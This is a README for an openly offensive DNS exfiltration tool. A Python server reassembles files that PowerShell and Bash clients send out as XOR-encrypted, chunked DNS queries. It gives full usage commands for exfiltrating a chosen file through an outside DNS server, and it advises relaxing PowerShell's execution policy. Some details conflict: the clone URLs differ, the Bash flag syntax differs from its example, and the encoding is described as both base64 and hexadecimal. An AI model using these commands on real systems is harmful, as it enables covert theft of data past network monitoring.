# DNS Exfiltration Tool

## DNS Server in Python (dnsexfil_server.py)

### Overview

The Python server script (`dnsexfil_server.py`) listens for DNS queries and reconstructs files sent by the exfiltration clients.

### Features

- **XOR Decryption:** Decrypts received data chunks using XOR decryption with the specified password.
- **File Compression:** Reconstructs and extracts received files locally.
- **Simultaneous Transfer:** Supports simultaneous connections and transfers.
- **Resume Interrupted Transfer:** Supports resuming interrupted transfer.
- **Error Handling:** Ignores queries received twice, and ignores queries with unknown or simple format.
- **TCP/UDP Support:** Can handle both TCP and UDP DNS queries.

### Requirements

- Python 3.x
- `dnslib` library

### Installation

1. Clone or download the repository to your local machine:

```bash
git clone https://github.com/lefayjey/DNSExfil
```

2. Install the required Python libraries:
```bash
pip install dnslib
_or_
sudo apt install python3-dnslib
```

### Usage

**Syntax**

```bash
python3 dnsexfil_server.py <dns_server_ip> <password> [--usetcp]
```

**Parameters**

- `<dns_server_ip>`: IP address of the DNS server where the server should listen for queries.
- `<password>`: Password used by clients for XOR encryption.
- `--usetcp` (optional): Use TCP instead of UDP for handling DNS queries.

**Example**

```bash
python3 dnsexfil_server.py 192.168.1.100 securepass --usetcp
```

**Notes**

Ensure that the server is configured to listen on a DNS server IP address that can receive DNS queries from clients.
The server decrypts and reconstructs files based on received DNS queries.

## DNS Client in PowerShell (dnsexfil_client.ps1)

### Overview

The PowerShell script (`dnsexfil_client.ps1`) exfiltrates files over DNS using XOR encryption and base64 encoding.

### Features
- **XOR Encryption**: Encrypts file data using XOR encryption with a user-provided password.
- **Base64 Encoding**: Converts encrypted data to base64 before sending as DNS queries.
- **Chunking**: Splits large files into smaller chunks to fit within DNS query size limits.
- **Compression**: Uses gzip compression to reduce the size of data before encryption.
- **TCP/UDP Support**: Option to use TCP instead of UDP for DNS queries.

### Requirements

- PowerShell (version 3.0 or higher recommended)
- Windows operating system (script may require adjustments for other platforms)
- Access to a DNS server for sending queries

### Installation

1. Clone or download the repository to your local machine:

```powershell
git clone https://github.com/lefayjey/DNSExfiltration
```

2. No additional installation steps are required. Ensure PowerShell script execution policy allows running the script (`Set-ExecutionPolicy RemoteSigned` or `Set-ExecutionPolicy Unrestricted`).

### Usage

**Syntax**

```powershell
.\dnsexfil_client.ps1 -FilePath <file_path> -Domain <domain> -DnsServerIp <dns_server_ip> -Password <password> [-UseTcp]
```
**Parameters**

- `-FilePath`: Path to the file you want to exfiltrate.
- `-Password`: Password to be used in XOR encryption.
- `-Domain`: Domain to use in DNS queries.
- `-DnsServerIp`: IP address of the DNS server.
- `-UseTcp` (optional): Use TCP instead of UDP for DNS queries.

**Example**

```powershell
.\dnsexfil_client.ps1 -FilePath "C:\path\to\your\file" -Domain "example.com" -DnsServerIp "8.8.8.8" -Password "securepass" -UseTcp
```

**Notes**

Ensure that the DNS server configured (`-DnsServerIp`) can receive DNS queries.
Large files will be encrypted and split into smaller chunks to fit within DNS query size limits (typically 255 bytes).

## DNS Client in Bash (dnsexfil_client.sh)

### Overview

The Bash client script (`dnsexfil_client.sh`) exfiltrates files over DNS using XOR encryption and base64 encoding.

### Features

- **XOR Encryption**: Encrypts file data using XOR encryption with a user-provided password.
- **Base64 Encoding**: Converts encrypted data to base64 before sending as DNS queries.
- **Chunking**: Splits large files into smaller chunks to fit within DNS query size limits.
- **Compression**: Uses gzip compression to reduce the size of data before encryption.
- **TCP/UDP Support**: Option to use TCP instead of UDP for DNS queries.

### Requirements
- Unix-based operating system (Linux, macOS, etc.)
- Install xortool tool (`pip3 install xortool`)
- nslookup or equivalent DNS tool installed

### Installation

1. Clone or download the repository to your local machine:

```bash
git clone https://github.com/lefayjey/DNSExfiltration
```

2. No additional installation steps are required.

### Usage

**Syntax**

```bash
./dnsexfil_client.sh -f <file_path> -p <password> -d <domain> -s <dns_server_ip> [-t]
```

**Parameters**

- `-f`: Path to the file you want to exfiltrate.
- `-p`: Password to be used in XOR encryption.
- `-d`: Domain to use in DNS queries.
- `-s`: IP address of the DNS server.
- `-t` (optional): Use TCP instead of UDP for DNS queries.

**Example**

```bash
./dnsexfil_client.sh -f "/path/to/your/file" -p "securepass" -d "example.com" -s "8.8.8.8" --use-tcp
```

**Notes**

Ensure that the DNS server configured (`-s`) can receive DNS queries.
Large files will be encrypted and split into smaller chunks to fit within DNS query size limits (typically 255 bytes).
Encrypted data is sent as hexadecimal strings in DNS queries.

# License
This project is licensed under the MIT License - see the LICENSE file for details.

# Acknowledgments
Inspired by the following DNS exfiltration tools:
- https://github.com/Arno0x/DNSExfiltrator
- https://github.com/m57/dnsteal
